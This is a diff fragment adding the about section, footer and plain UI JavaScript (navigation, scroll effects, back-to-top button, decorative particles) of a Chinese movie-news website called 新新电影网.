+      <h2 class="section-title">🎯 关于新新电影网</h2>
+      <p class="section-desc">用心推荐好电影，让每一次观影都值得回味</p>
+    </div>
+    <div class="about-wrapper reveal">
+      <div class="about-content">
+        <p class="about-text">新新电影网成立于2020年，致力于为广大电影爱好者提供最新、最全面的电影资讯与深度影评。我们相信，每一部好电影都值得被看见，每一位观众都能在这里找到属于自己的光影故事。</p>
+        <div class="about-features">
+          <div class="feature-card"><div class="feature-icon">⚡</div><h5>实时更新</h5><p>第一时间同步全球电影资讯</p></div>
+          <div class="feature-card"><div class="feature-icon">🎯</div><h5>精准推荐</h5><p>基于你的喜好推荐好电影</p></div>
+          <div class="feature-card"><div class="feature-icon">✍️</div><h5>深度影评</h5><p>专业视角带你读懂每一帧</p></div>
+          <div class="feature-card"><div class="feature-icon">🌐</div><h5>全网覆盖</h5><p>院线、网络、经典全面收录</p></div>
+        </div>
+        <div class="about-stats">
+          <div class="stat-box"><span class="stat-num">10w+</span><span class="stat-label">收录影片</span></div>
+          <div class="stat-box"><span class="stat-num">500w+</span><span class="stat-label">忠实用户</span></div>
+          <div class="stat-box"><span class="stat-num">5k+</span><span class="stat-label">深度影评</span></div>
+          <div class="stat-box"><span class="stat-num">365天</span><span class="stat-label">每日更新</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== FOOTER ==================== -->
+<footer class="footer">
+  <div class="footer-inner">
+    <div class="footer-logo">新新<span>电影网</span></div>
+    <p class="footer-desc">发现好电影，从这里开始。最新电影资讯、热门影视推荐、经典影片回顾、深度影评解说。</p>
+    <div class="footer-links">
+      <a href="#top">首页</a>
+      <a href="#movies">最新热映</a>
+      <a href="#reviews">影评解说</a>
+      <a href="#classics">经典回顾</a>
+      <a href="#news">电影资讯</a>
+      <a href="#about">关于我们</a>
+    </div>
+    <div class="footer-bottom">
+      <p>© 2026 新新电影网 版权所有 | 网站地址：<a href="https://xinxindianyingwang-wap.github.io">xinxindianyingwang-wap.github.io</a></p>
+    </div>
+  </div>
+</footer>
+
+<!-- ==================== BACK TO TOP ==================== -->
+<div class="back-top" id="backTop">↑</div>
+
+<!-- ==================== JAVASCRIPT ==================== -->
+<script>
+(function(){
+  'use strict';
+
+  // ---- Loader ----
+  window.addEventListener('load', function(){
+    setTimeout(function(){ document.getElementById('loader').classList.add('hidden'); }, 500);
+  });
+
+  // ---- Mobile Nav ----
+  var navToggle = document.getElementById('navToggle');
+  var navLinks = document.getElementById('navLinks');
+  navToggle.addEventListener('click', function(){
+    navToggle.classList.toggle('open');
+    navLinks.classList.toggle('open');
+  });
+  navLinks.querySelectorAll('a').forEach(function(a){
+    a.addEventListener('click', function(){
+      navToggle.classList.remove('open');
+      navLinks.classList.remove('open');
+    });
+  });
+
+  // ---- Scroll Reveal ----
+  var revealEls = document.querySelectorAll('.reveal');
+  if('IntersectionObserver' in window){
+    var io = new IntersectionObserver(function(entries){
+      entries.forEach(function(e){
+        if(e.isIntersecting){ e.target.classList.add('active'); io.unobserve(e.target); }
+      });
+    },{ threshold:0.12 });
+    revealEls.forEach(function(el){ io.observe(el); });
+  } else {
+    revealEls.forEach(function(el){ el.classList.add('active'); });
+  }
+
+  // ---- Active Nav Link ----
+  var sections = document.querySelectorAll('section[id], header[id]');
+  var navAs = document.querySelectorAll('.nav-links a');
+  function updateNav(){
+    var scrollPos = window.scrollY + 100;
+    sections.forEach(function(sec){
+      if(scrollPos >= sec.offsetTop && scrollPos < sec.offsetTop + sec.offsetHeight){
+        navAs.forEach(function(a){ a.classList.remove('active'); });
+        var active = document.querySelector('.nav-links a[href="#'+sec.id+'"]');
+        if(active) active.classList.add('active');
+      }
+    });
+  }
+  window.addEventListener('scroll', updateNav);
+  updateNav();
+
+  // ---- Hide Nav on Scroll Down ----
+  var lastScroll = 0;
+  var navbar = document.getElementById('navbar');
+  window.addEventListener('scroll', function(){
+    var curr = window.scrollY;
+    if(curr > lastScroll && curr > 200){ navbar.classList.add('scroll-down'); }
+    else { navbar.classList.remove('scroll-down'); }
+    lastScroll = curr;
+  });
+
+  // ---- Back to Top ----
+  var backTop = document.getElementById('backTop');
+  window.addEventListener('scroll', function(){
+    if(window.scrollY > 400){ backTop.classList.add('show'); }
+    else { backTop.classList.remove('show'); }
+  });
+  backTop.addEventListener('click', function(){ window.scrollTo({top:0, behavior:'smooth'}); });
+
+  // ---- Particles ----
+  var container = document.getElementById('particles');
+  var count = window.innerWidth < 768 ? 20 : 40;
+  for(var i=0;i<count;i++){
+    var p = document.createElement('div');
+    p.className = 'particle';
+    p.style.left = Math.random()*100 + '%';
+    p.style.animationDuration = (Math.random()*3+3) + 's';
+    p.style.animationDelay = (Math.random()*5) + 's';
+    p.style.width = p.style.height = (Math.random()*3+2) + 'px';
+    container.appendChild(p);
+  }
+})();
+</script>
+</body>
+</html>
